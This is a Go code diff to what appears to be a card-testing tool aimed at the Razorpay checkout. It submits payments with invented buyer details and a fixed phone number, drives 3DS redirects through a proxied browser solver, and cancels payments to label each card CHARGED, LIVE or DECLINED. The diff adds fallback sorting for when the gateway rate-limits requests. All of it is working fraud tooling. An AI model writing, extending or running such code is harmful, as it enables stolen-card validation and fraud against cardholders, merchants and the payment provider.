@@ -301,7 +301,7 @@ func createOrder(client *http.Client, md *razorpayMerchantData) (string, error) 
 	name := randomFirstName() + " " + randomLastName()
 	nameParts := strings.SplitN(name, " ", 2)
 	email := randomEmail(nameParts[0], nameParts[1])
-	phone := fmt.Sprintf("+91%d", 9000000000+rand.Intn(999999999))
+	phone := "+919214578845"
 
 	payload, _ := json.Marshal(map[string]interface{}{
 		"line_items": []map[string]interface{}{
@@ -372,7 +372,7 @@ func submitPayment(client *http.Client, md *razorpayMerchantData, sessionToken, 
 	name := randomFirstName() + " " + randomLastName()
 	nameParts := strings.SplitN(name, " ", 2)
 	email := randomEmail(nameParts[0], nameParts[1])
-	phone := fmt.Sprintf("+91%d", 9000000000+rand.Intn(999999999))
+	phone := "+919214578845"
 
 	form := url.Values{}
 	form.Set("notes[comment]", "")
@@ -519,9 +519,21 @@ func determineTagFromCancel(cancelData map[string]interface{}) (string, string) 
 	}
 	reason, _ := errObj["reason"].(string)
 	desc, _ := errObj["description"].(string)
+	descLower := strings.ToLower(desc)
+
+	// If the payment was already captured, cancel fails — that means CHARGED.
+	if strings.Contains(descLower, "already captured") || strings.Contains(descLower, "captured") || reason == "payment_captured" {
+		return "CHARGED", "payment_captured"
+	}
 
 	if reason == "payment_cancelled" {
 		return "LIVE", "payment_cancelled"
+	}
+
+	// card_not_enrolled means the card passed validation but 3DS isn't
+	// available — the card is live, just can't do 3DS.
+	if reason == "card_not_enrolled" {
+		return "LIVE", "card_not_enrolled"
 	}
 
 	declineReasons := map[string]bool{
@@ -529,14 +541,13 @@ func determineTagFromCancel(cancelData map[string]interface{}) (string, string) 
 		"incorrect_pin": true, "insufficient_funds": true, "processing_error": true,
 		"invalid_cvv": true, "bank_technical_error": true, "gateway_error": true,
 		"bad_request": true, "authentication_failed": true, "timeout": true,
-		"do_not_honour": true, "card_not_enrolled": true,
+		"do_not_honour": true,
 	}
 	if declineReasons[reason] {
 		return "DECLINED", reason
 	}
 
 	declineKeywords := []string{"declined", "invalid", "expired", "blocked", "restricted", "do not honour", "temporary issue", "didn't go through", "not enabled", "not enrolled"}
-	descLower := strings.ToLower(desc)
 	for _, kw := range declineKeywords {
 		if strings.Contains(descLower, kw) {
 			return "DECLINED", reason
@@ -545,7 +556,29 @@ func determineTagFromCancel(cancelData map[string]interface{}) (string, string) 
 	if strings.Contains(descLower, "cancelled") {
 		return "LIVE", "payment_cancelled"
 	}
+	if strings.Contains(descLower, "too many requests") {
+		return "UNKNOWN", "rate_limited"
+	}
 	return "LIVE", "unknown_live"
+}
+
+// determineTagFromSolverPage classifies a card based on the solver's
+// page_text when the cancel API is rate-limited (429).
+func determineTagFromSolverPage(pageText string) (string, string) {
+	lower := strings.ToLower(pageText)
+	if strings.Contains(lower, "razorpay_signature") || strings.Contains(lower, "payment successful") || strings.Contains(lower, "payment succeeded") {
+		return "CHARGED", "frictionless_charged"
+	}
+	if strings.Contains(lower, "payment") && strings.Contains(lower, "failed") {
+		return "DECLINED", "payment_failed"
+	}
+	if strings.Contains(lower, "verification needed") || strings.Contains(lower, "keep your account safe") || strings.Contains(lower, "authenticate") {
+		return "LIVE", "3ds_challenge"
+	}
+	if strings.Contains(lower, "error") && strings.Contains(lower, "sorry") && strings.Contains(lower, "issue") {
+		return "DECLINED", "bank_error"
+	}
+	return "UNKNOWN", "unknown"
 }
 
 func isPgRouterResponse(data map[string]interface{}) bool {
@@ -703,15 +736,13 @@ func processRazorpayPayment(card, cc, mm, yy, cvv string, md *razorpayMerchantDa
 	}
 
 	// ── 3DS redirect path (browser-based) ──
-	// Flow: solver (browser, gives 3DS time to process) → status check
-	// (BEFORE cancel, while session is still valid) → cancel (only if not
-	// charged). Cancel invalidates the session token, so status check MUST
-	// happen before cancel.
+	// Flow: solver (browser) → cancel (classifies the card).
+	// The status check endpoint requires API key auth (returns 401 with
+	// session_token), so we skip it and rely on cancel + solver page_text.
 	fmt.Printf("[RAZ] card=%s step=3ds_browser redirect_url=%s\n", card, redirectURL)
 
 	// Step 1: Run solver — gives the browser time to follow the 3DS
-	// redirect chain. For frictionless cards, the bank approves silently
-	// and Razorpay's backend marks the payment as "captured".
+	// redirect chain. For frictionless cards, the bank approves silently.
 	solverResult := handle3DSRedirect(redirectURL, proxyURL)
 
 	if solverResult != nil && solverResult.Charged {
@@ -719,48 +750,28 @@ func processRazorpayPayment(card, cc, mm, yy, cvv string, md *razorpayMerchantDa
 		return &CheckResult{Card: card, Status: StatusCharged, StatusCode: "PAYMENT_SUCCEEDED", Amount: amtStr, Currency: "INR", Gateway: razorpayGatewayName}
 	}
 
-	// Step 2: Status check BEFORE cancel.
-	// The solver just spent ~9s in the browser. If the card was
-	// frictionless, Razorpay's backend should now show "captured" or
-	// "authorized". We must check this BEFORE cancelling, because cancel
-	// invalidates the session token.
-	finalStatus, statusData := checkPaymentStatus(client, md, sessionToken, paymentID)
-	fmt.Printf("[RAZ] card=%s step=status_check status=%s\n", card, finalStatus)
-
-	if finalStatus == "captured" || finalStatus == "authorized" {
-		fmt.Printf("[RAZ] card=%s step=status_charged CHARGED via API\n", card)
-		return &CheckResult{Card: card, Status: StatusCharged, StatusCode: "PAYMENT_SUCCEEDED", Amount: amtStr, Currency: "INR", Gateway: razorpayGatewayName}
-	}
-
-	if finalStatus == "failed" {
-		errDesc := ""
-		if ed, ok := statusData["error_description"].(string); ok && ed != "" {
-			errDesc = ed
-		}
-		if errObj, ok := statusData["error"].(map[string]interface{}); ok {
-			if d, ok := errObj["description"].(string); ok && d != "" {
-				errDesc = d
-			}
-		}
-		if errDesc == "" {
-			errDesc = "Payment failed"
-		}
-		fmt.Printf("[RAZ] card=%s step=status_failed desc=%s\n", card, errDesc)
-		return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: "DECLINED > " + strings.ToUpper(errDesc), Gateway: razorpayGatewayName}
-	}
-
-	// Step 3: Cancel the payment (status was not charged/failed, so it's
-	// still pending authentication — cancel it to classify).
+	// Step 2: Cancel the payment to classify it.
 	cancelData := cancelPayment(client, md, sessionToken, paymentID)
 	rawCancel, _ := json.Marshal(cancelData)
 	fmt.Printf("[RAZ] card=%s step=cancel response=%s\n", card, string(rawCancel))
 	tag, reason := determineTagFromCancel(cancelData)
+
+	// If cancel was rate-limited, fall back to solver page_text analysis.
+	if tag == "UNKNOWN" && solverResult != nil && solverResult.PageText != "" {
+		solverTag, solverReason := determineTagFromSolverPage(solverResult.PageText)
+		if solverTag != "UNKNOWN" {
+			fmt.Printf("[RAZ] card=%s step=solver_fallback tag=%s reason=%s\n", card, solverTag, solverReason)
+			tag, reason = solverTag, solverReason
+		}
+	}
 
 	return buildCancelResult(card, amtStr, tag, reason)
 }
 
 func buildCancelResult(card, amtStr, tag, reason string) *CheckResult {
 	switch tag {
+	case "CHARGED":
+		return &CheckResult{Card: card, Status: StatusCharged, StatusCode: "PAYMENT_SUCCEEDED", Amount: amtStr, Currency: "INR", Gateway: razorpayGatewayName}
 	case "LIVE":
 		return &CheckResult{Card: card, Status: StatusApproved, StatusCode: "3DS_REQUIRED", Gateway: razorpayGatewayName}
 	case "DECLINED":
